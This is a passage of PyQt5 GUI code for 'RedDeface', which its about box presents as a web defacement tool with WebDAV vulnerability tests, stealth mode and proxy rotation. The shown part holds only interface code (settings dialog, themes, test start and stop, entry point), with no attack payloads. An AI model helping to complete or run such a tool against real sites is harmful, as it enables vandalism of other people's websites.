        layout.addRow("Theme:", theme_combo)
        
        # Language
        language_combo = QComboBox()
        language_combo.addItems(["English", "French", "Spanish"])
        layout.addRow("Language:", language_combo)
        
        # Font size
        font_size = QSpinBox()
        font_size.setRange(8, 20)
        font_size.setValue(10)
        layout.addRow("Font size:", font_size)
        
        # Buttons
        button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        button_box.accepted.connect(settings_dialog.accept)
        button_box.rejected.connect(settings_dialog.reject)
        layout.addRow(button_box)
        
        settings_dialog.setLayout(layout)
        
        if settings_dialog.exec_() == QDialog.Accepted:
            self.statusBar().showMessage("Preferences saved")
    
    def change_theme(self, theme_name):
        """Change application theme"""
        # Basic implementation - extend with complete stylesheets
        if theme_name == "cyberpunk":
            self.statusBar().showMessage("Cyberpunk theme activated")
        elif theme_name == "dark":
            self.statusBar().showMessage("Dark theme activated")
        elif theme_name == "light":
            self.statusBar().showMessage("Light theme activated")
    
    def show_about(self):
        """Show about dialog"""
        QMessageBox.about(self, "About RedDeface",
                         "RedDeface - Advanced Web Defacement Tool\n\n"
                         "Version: 2.0 \n"
                         "- Coding By Hackfut Security\n"
                         "Developed with PyQt5\n\n"
                         "Advanced features:\n"
                         "- Multiple WebDAV vulnerability tests\n"
                         "- Modern cyberpunk interface\n"
                         "- Detailed reports and exports\n"
                         "- Stealth mode and proxy rotation")
    
    def show_documentation(self):
        """Show documentation"""
        # Open browser with documentation
        import webbrowser
        webbrowser.open("https://github.com/HackfutSec/reddeface/docs")
    
    def run_selected_test(self):
        """Run test selected in current tab"""
        current_tab = self.tabs.currentIndex()
        if current_tab == 0:
            self.run_single_test()
        elif current_tab == 1:
            self.run_multi_test()
        else:
            QMessageBox.information(self, "Information", "Please select a test tab.")
    
    def stop_current_test(self):
        """Stop current test"""
        if hasattr(self, 'single_test_thread') and self.single_test_thread.isRunning():
            self.single_test_thread.stop()
            self.single_test_btn.setEnabled(True)
            self.statusBar().showMessage("Single test stopped")
        
        if hasattr(self, 'multi_test_thread') and self.multi_test_thread.isRunning():
            self.multi_test_thread.stop()
            self.multi_test_btn.setEnabled(True)
            self.statusBar().showMessage("Multi test stopped")
    
    def paintEvent(self, event):
        # Draw background image if it exists
        if self.background_image and not self.background_image.isNull():
            painter = QtGui.QPainter(self)
            painter.drawPixmap(0, 0, self.width(), self.height(), self.background_image)
        super().paintEvent(event)

# Main entry point
def main():
    app = QApplication(sys.argv)
    window = CyberPunkWindow()
    window.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()